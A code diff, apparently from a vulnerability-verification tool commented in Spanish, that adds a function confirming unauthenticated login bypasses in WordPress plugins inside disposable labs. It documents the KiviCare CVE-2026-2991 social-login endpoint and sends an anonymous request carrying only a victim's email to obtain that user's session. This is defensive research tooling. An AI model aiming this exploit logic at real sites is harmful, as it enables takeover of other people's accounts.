@@ -1126,6 +1126,17 @@ def _bootstrap_lab(lab: "_Lab", plugin_source_dir: str, slug: str, step, res: Wp
         res.detail = f"wp core install fallo: {(r.stderr or r.stdout or '')[:300]}"
         res.evidence["screenshots"] = shots
         return None
+    # Bug real confirmado en vivo investigando CVE-2026-2991 (KiviCare): `wp core install` deja
+    # la estructura de permalinks en "plain" (?p=123) por defecto -- con eso, cualquier endpoint
+    # `/wp-json/...` (register_rest_route(), el patron CADA VEZ mas comun en plugins nuevos en
+    # vez del viejo admin-ajax.php) NO reescribe de verdad: WordPress devuelve la portada HTML
+    # con 200 en vez de la respuesta JSON de la ruta REST, silenciosamente -- cada verificador
+    # que ataca o confirma via /wp-json/ (este incluido) fallaba siempre, sin relacion alguna con
+    # si la vulnerabilidad es real. Todos los CVEs reales investigados ANTES en este proyecto
+    # (CVE-2024-1071/3552/43982/50508) resultaron ser admin-ajax.php, que funciona igual con
+    # cualquier estructura de permalinks -- por eso este hueco no se habia notado hasta ahora.
+    lab.wp_cli("rewrite", "structure", "/%postname%/", timeout=30)
+    lab.wp_cli("rewrite", "flush", timeout=30)
     # WP_DEBUG siempre activo en el laboratorio efimero -- confirmado en vivo, CVE-2024-3552:
     # sin esto, wpdb oculta cualquier error real de MySQL (p.ej. el que provocan a proposito
     # extractvalue()/updatexml() en el error-based) y, desde WP 5.2, un fatal error de PHP se
@@ -1643,6 +1654,157 @@ def verify_wordpress_direct_login_as(
                           f"real exige un _wpnonce, incluyelo en 'parameters' (ver limitacion en "
                           f"el docstring de esta funcion)")
         res.evidence["screenshots"] = boot.shots
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        _finalize_lab(lab, boot, res, step, keep_lab_on_failure)
+
+
+def verify_wordpress_unauthenticated_login_bypass(
+    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, email_param_hint: str = "", victim_role: str = "subscriber",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+    companion_plugins: Optional[list] = None,
+    shortcode_name: Optional[str] = None,
+    keep_lab_on_failure: bool = False,
+) -> WpVerifyResult:
+    """Verifica una TERCERA forma de missing-authorization, distinta de las dos anteriores
+    (verify_wordpress_account_takeover cambia una credencial ajena con una sesion de bajo
+    privilegio YA autenticada; verify_wordpress_direct_login_as suplanta a OTRO usuario por ID
+    con una sesion de bajo privilegio YA autenticada): aqui NO hace falta NINGUNA sesion previa --
+    el endpoint es publico (`permission_callback => '__return_true'` o equivalente) y deja al
+    atacante autenticarse directamente como un usuario YA EXISTENTE con solo saber un dato suyo
+    no secreto (tipicamente su email), sin validar la credencial/token que dice aportar contra
+    nada real.
+
+    Confirmado en vivo, CVE-2026-2991 (KiviCare para WordPress, AuthController::patientSocialLogin,
+    endpoint POST /wp-json/kivicare/v1/auth/patient/social-login, permission_callback
+    '__return_true'): busca un usuario existente por email/telefono, y si lo encuentra, llama
+    wp_set_auth_cookie($user_id) sin comprobar el 'access_token' del proveedor social contra NADA
+    -- cualquiera que conozca el email de un paciente ya registrado queda autenticado como el,
+    sin password ni token real.
+
+    `victim_role` crea una victima PROPIA (no reutiliza el subscriber generico de
+    _bootstrap_lab) con ese rol exacto -- algunos plugins (KiviCare incluido) solo buscan/aceptan
+    usuarios con un rol que ELLOS definen (p.ej. 'kiviCare_patient'), asi que un subscriber
+    generico podria no ser un objetivo realista para el endpoint concreto; por eso es
+    configurable en vez de fijo.
+
+    Ataca con una sesion ANONIMA (sin login previo, a diferencia de los otros dos verificadores).
+    `verified=True` SOLO si una pagina DISTINTA e independiente (`/wp-admin/profile.php`, propia
+    de CUALQUIER usuario logueado, autenticacion solo por cookie -- nunca una ruta REST que
+    pudiera exigir un nonce de por medio) confirma, con las cookies que la propia peticion de
+    ataque dejo, que esa sesion esta autenticada como ese usuario exacto (su email real aparece
+    en la pagina) -- nunca una deduccion por el codigo de estado del endpoint atacado, que puede
+    devolver 200 (o incluso 403, si el plugin aplica una comprobacion de rol DESPUES de dejar el
+    auth cookie puesto -- confirmado en vivo exactamente asi contra KiviCare: el login ya se
+    hizo real antes de que el 403 se calculara) por razones ajenas al login en si. Siempre
+    desmonta el laboratorio al terminar."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(plugin_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    email_param = email_param_hint or _pick_param(parameters, _EMAIL_HINTS)
+    if not email_param:
+        res.detail = "no se identifico el parametro de email de la victima en la hipotesis"
+        res.limitations.append("la verificacion de login bypass no autenticado necesita saber "
+                               "que parametro lleva el email de un usuario ya existente; afina "
+                               "'parameters' en la hipotesis del LLM o pasalo a mano "
+                               "(email_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    boot = None
+    try:
+        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
+                              companion_plugins=companion_plugins, shortcode_name=shortcode_name)
+        if boot is None:
+            return res
+
+        victim_user = f"binoracle_victim_{_token()}"
+        victim_email = f"{victim_user}@binoracle-lab.invalid"
+        step(f"creando la victima real (rol '{victim_role}', email conocido) a la que el "
+             f"atacante nunca inicio sesion...")
+        r_victim = lab.wp_cli("user", "create", victim_user, victim_email,
+                              f"--role={victim_role}", timeout=30)
+        if r_victim.returncode != 0:
+            res.detail = (f"no se pudo crear la victima con rol '{victim_role}': "
+                          f"{(r_victim.stderr or r_victim.stdout or '')[:300]}")
+            res.limitations.append("confirma que victim_role es un rol real que el plugin "
+                                   "objetivo registro al activarse")
+            return res
+        victim_id = lab.wp_cli("user", "get", victim_user, "--field=ID", timeout=30).stdout.strip()
+
+        m = (http_method or "POST").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        base_params[email_param] = victim_email
+        res.evidence.update({
+            "victima_user_id": victim_id, "victima_email": victim_email, "metodo": m,
+            "endpoint": endpoint, "email_param": email_param, "payload_enviado": dict(base_params),
+        })
+
+        anon = _make_session()
+        step(f"peticion ANONIMA (sin ninguna sesion previa) contra {m} {endpoint}, solo con el "
+             f"email de una victima real '{victim_email}' -- ninguna credencial/token real...")
+        try:
+            resp = anon.request(m, boot.base_url + endpoint,
+                                data=base_params if m != "GET" else None,
+                                params=base_params if m == "GET" else None, timeout=20)
+        except Exception as e:
+            res.detail = f"fallo enviando la peticion: {e}"
+            return res
+        res.evidence["status_code_respuesta"] = resp.status_code
+        res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+
+        # confirmacion por COOKIE sola, nunca por un nonce REST -- bug real encontrado en vivo
+        # escribiendo el test de este verificador: /wp-json/wp/v2/users/me exige un X-WP-Nonce
+        # valido incluso con la cookie de sesion correcta (rest_cookie_check_errors, anti-CSRF),
+        # y ese nonce solo sale bien formado en la respuesta del propio endpoint atacado si ESE
+        # codigo hace un truco especifico (reescribir $_COOKIE[LOGGED_IN_COOKIE] en el mismo
+        # request antes de llamar wp_create_nonce) -- la KiviCare real SI lo hace, pero exigirlo
+        # habria dado un FALSO NEGATIVO contra cualquier plugin vulnerable que no lo haga, aunque
+        # la cookie de sesion fuera perfectamente real y valida. /wp-admin/profile.php, en
+        # cambio, es una pagina HTML (nunca una ruta REST) que CUALQUIER usuario logueado puede
+        # ver de su PROPIO perfil -- autenticacion solo por cookie, sin nonce de ningun tipo
+        # (mismo mecanismo ya usado por verify_wordpress_direct_login_as) -- y siempre imprime el
+        # email real del usuario actual en un campo del formulario, asi que basta para confirmar
+        # la IDENTIDAD exacta, no solo "alguna sesion quedo logueada".
+        step("confirmando identidad con una pagina DISTINTA e independiente "
+             "(/wp-admin/profile.php, solo cookie, sin nonce), nunca una deduccion por el codigo "
+             "de estado del propio endpoint atacado...")
+        try:
+            prof = anon.get(boot.base_url + "/wp-admin/profile.php", timeout=15,
+                           allow_redirects=True)
+        except Exception as e:
+            res.detail = f"fallo confirmando identidad: {e}"
+            return res
+        res.evidence["profile_status"] = prof.status_code
+        logged_in_as_someone = (prof.status_code == 200 and "wp-login.php" not in prof.url)
+        identity_matches = logged_in_as_someone and victim_email in prof.text
+
+        res.ok = True
+        if victim_id and identity_matches:
+            res.verified = True
+            res.detail = (f"LOGIN BYPASS NO AUTENTICADO confirmado: una peticion SIN sesion "
+                          f"previa, aportando solo el email de una victima real (sin password ni "
+                          f"token validos), dejo esa sesion autenticada como el usuario real "
+                          f"id={victim_id} -- confirmado por /wp-admin/profile.php (solo cookie, "
+                          f"sin nonce), que muestra el email real de esa victima exacta, no por "
+                          f"el {resp.status_code} del propio endpoint atacado")
+            step(f"VERIFICADO: /wp-admin/profile.php confirma la identidad de '{victim_email}' "
+                 f"sin que el atacante aportara ninguna credencial real.")
+        else:
+            res.detail = (f"la peticion no autenticada devolvio {resp.status_code} pero "
+                          f"/wp-admin/profile.php no confirmo la identidad de la victima "
+                          f"(logueado como alguien: {logged_in_as_someone})")
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
